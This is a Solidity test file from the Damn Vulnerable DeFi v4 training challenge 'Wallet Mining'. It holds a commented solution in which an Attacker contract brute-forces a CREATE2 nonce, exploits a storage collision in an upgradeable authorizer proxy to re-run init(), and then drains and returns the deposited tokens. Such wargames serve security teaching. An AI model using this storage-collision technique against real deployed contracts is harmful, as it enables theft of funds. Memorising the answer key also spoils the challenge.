// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {
    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
} from "../../src/wallet-mining/AuthorizerFactory.sol";

import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "forge-std/Vm.sol";
import "forge-std/StdCheats.sol";

contract WalletMiningChallenge is Test {
    address deployer = makeAddr("deployer");
    address upgrader = makeAddr("upgrader");
    address ward = makeAddr("ward");
    address player = makeAddr("player");
    address user;
    uint256 userPrivateKey;

    address constant USER_DEPOSIT_ADDRESS = 0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b;
    uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;

    address constant SAFE_SINGLETON_FACTORY_ADDRESS = 0x914d7Fec6aaC8cd542e72Bca78B30650d45643d7;
    bytes constant SAFE_SINGLETON_FACTORY_CODE =
        hex"7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffe03601600081602082378035828234f58015156039578182fd5b8082525050506014600cf3";

    DamnValuableToken token;
    AuthorizerUpgradeable authorizer;
    WalletDeployer walletDeployer;
    SafeProxyFactory proxyFactory;
    Safe singletonCopy;

    uint256 initialWalletDeployerTokenBalance;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        // Player should be able to use the user's private key
        (user, userPrivateKey) = makeAddrAndKey("user");

        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy authorizer with a ward authorized to deploy at DEPOSIT_ADDRESS
        address[] memory wards = new address[](1);
        wards[0] = ward;
        address[] memory aims = new address[](1);
        aims[0] = USER_DEPOSIT_ADDRESS;
        AuthorizerFactory authorizerFactory = new AuthorizerFactory();
        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));

        // Send big bag full of DVT tokens to the deposit address
        token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Include Safe singleton factory in this chain
        vm.etch(SAFE_SINGLETON_FACTORY_ADDRESS, SAFE_SINGLETON_FACTORY_CODE);

        // Call singleton factory to deploy copy and factory contracts
        (bool success, bytes memory returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
        singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));

        (success, returndata) =
            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
        proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));

        // Deploy wallet deployer
        walletDeployer = new WalletDeployer(address(token), address(proxyFactory), address(singletonCopy));

        // Set authorizer in wallet deployer
        walletDeployer.rule(address(authorizer));

        // Fund wallet deployer with tokens
        initialWalletDeployerTokenBalance = walletDeployer.pay();
        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Check initialization of authorizer
        assertNotEq(address(authorizer), address(0));
        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
        assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
        assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));

        // Check initialization of wallet deployer
        assertEq(walletDeployer.chief(), deployer);
        assertEq(walletDeployer.gem(), address(token));
        assertEq(walletDeployer.mom(), address(authorizer));

        // Ensure DEPOSIT_ADDRESS starts empty
        assertEq(USER_DEPOSIT_ADDRESS.code, hex"");

        // Factory and copy are deployed correctly
        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");

        // Ensure initial token balances are set correctly
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
        assertGt(initialWalletDeployerTokenBalance, 0);
        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_walletMining() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(
            vm,
            token,
            authorizer,
            walletDeployer,
            proxyFactory,
            singletonCopy,
            player,
            ward,
            user,
            userPrivateKey,
            USER_DEPOSIT_ADDRESS,
            DEPOSIT_TOKEN_AMOUNT
        );
        attacker.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Factory account must have code
        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");

        // Safe copy account must have code
        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");

        // Deposit account must have code
        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");

        // The deposit address and the wallet deployer must not hold tokens
        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");

        // User account didn't execute any transactions
        assertEq(vm.getNonce(user), 0, "User executed a tx");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // Player recovered all tokens for the user
        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");
        // Player sent payment to ward
        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
    }
}

contract Attacker {
    Vm private vm;
    DamnValuableToken private token;
    AuthorizerUpgradeable private authorizer;
    WalletDeployer private walletDeployer;
    SafeProxyFactory private proxyFactory;
    Safe private singletonCopy;
    address private player;
    address private ward;
    address private user;
    uint256 private userPrivateKey;
    address private USER_DEPOSIT_ADDRESS;
    uint256 private DEPOSIT_TOKEN_AMOUNT;

    constructor(
        Vm _vm,
        DamnValuableToken _token,
        AuthorizerUpgradeable _authorizer,
        WalletDeployer _walletDeployer,
        SafeProxyFactory _proxyFactory,
        Safe _singletonCopy,
        address _player,
        address _ward,
        address _user,
        uint256 _userPrivateKey,
        address _USER_DEPOSIT_ADDRESS,
        uint256 _DEPOSIT_TOKEN_AMOUNT
    ) {
        vm = _vm;
        token = _token;
        authorizer = _authorizer;
        walletDeployer = _walletDeployer;
        proxyFactory = _proxyFactory;
        singletonCopy = _singletonCopy;
        player = _player;
        ward = _ward;
        user = _user;
        userPrivateKey = _userPrivateKey;
        USER_DEPOSIT_ADDRESS = _USER_DEPOSIT_ADDRESS;
        DEPOSIT_TOKEN_AMOUNT = _DEPOSIT_TOKEN_AMOUNT;
    }

    function attack() external {
        // STEP 1: Determine the nonce to deploy USER_DEPOSIT_ADDRESS
        //
        // - According to README.md:
        //   "The team transferred 20 million DVT tokens to a user at `0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b`,
        //   where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment."
        //   "Nobody knows what to do, let alone the user. She granted you access to her private key.
        //
        // - We prepare the wallet initializer by setting `user` as the wallet owner and a threshold of 1,
        //   leaving the remaining parameters blank. We then run a loop that uses `vm::computeCreate2Address()`
        //   to determine the correct nonce. This nonce will be used later in the challenge (STEP 3).
        bytes memory initializer;
        {
            address[] memory owners = new address[](1);
            owners[0] = user;
            initializer = abi.encodeWithSelector(
                    Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, payable(0));
        }

        uint256 targetNonce = 0;
        for (;;targetNonce++) {
            address targetAddr = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initializer), targetNonce)),
                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
                address(proxyFactory)
            );

            if (targetAddr == USER_DEPOSIT_ADDRESS) break;
        }

        // STEP 2: Exploit a Storage Collision
        //
        // - AuthorizerFactory::deployWithProxy() creates a TransparentProxy instance (an ERC1967Proxy)
        //   using an AuthorizerUpgradeable instance and the AuthorizerFactory::init() function with
        //   `wards` and `aims` as parameters. So far, so good.
        //
        // - Both AuthorizerUpgradeable and TransparentProxy access slot 0, creating a storage collision vulnerability.
        //   AuthorizerUpgradeable defines the variable `needsInit`, while TransparentProxy defines `upgrader`.
        //
        // - During the execution of `deployWithProxy()`, slot 0 is accessed in the following order:
        //   - `uint256 public needsInit = 1`: sets `needsInit` to 1
        //   - Creation of AuthorizerUpgradeable instance: sets `needsInit` to 0
        //   - `address public upgrader = msg.sender`: sets `upgrader` to the AuthorizerFactory instance's address
        //   - AuthorizerFactory::init(): checks the `upgrader` value, then sets `needsInit` to 0
        //   - `assert(AuthorizerUpgradeable(authorizer).needsInit() == 0)`: confirms `needsInit` is 0
        //   - `TransparentProxy(payable(authorizer)).setUpgrader(upgrader)`: sets the upgrader address
        //
        // - Since the `upgrader` value is different from 0, we can invoke `authorizer.init()` with custom parameters.
        {
            address[] memory wards = new address[](1);
            wards[0] = address(this);
            address[] memory aims = new address[](1);
            aims[0] = USER_DEPOSIT_ADDRESS;
            authorizer.init(wards, aims);
        }
        // STEP 3: Recovering the funds
        //
        // Using WalletDeployer::drop() to invoke SafeProxyFactory::createProxyWithNonce().
        //
        // - After identifying the nonce in STEP 1 and modifying the deployment privileges in STEP 2,
        //   we call WalletDeployer::drop() to deploy the wallet.
        //
        // - To transfer the funds from the newly created wallet back to the user, we utilize the cheat code
        //   vm.sign with the user's private key to compute the transaction signature. Ensure that the nonce
        //   (last parameter in getTransactionHash()) is set to 0, as the wallet address has not initiated any
        //   prior transactions.
        //
        // - Once the token transfer transaction is executed successfully, the recovered funds are sent to the ward.
        {
            walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, targetNonce);
            bytes memory callData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

            bytes32 transactionHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
                address(token),
                0,
                callData,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                payable(address(0)),
                0
            );

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, transactionHash);
            bytes memory signature = abi.encodePacked(r, s, v);

            Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
                address(token),
                0,
                callData,
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                payable(address(0)),
                signature
            );

            token.transfer(ward, token.balanceOf(address(this)));
        }
    }
}
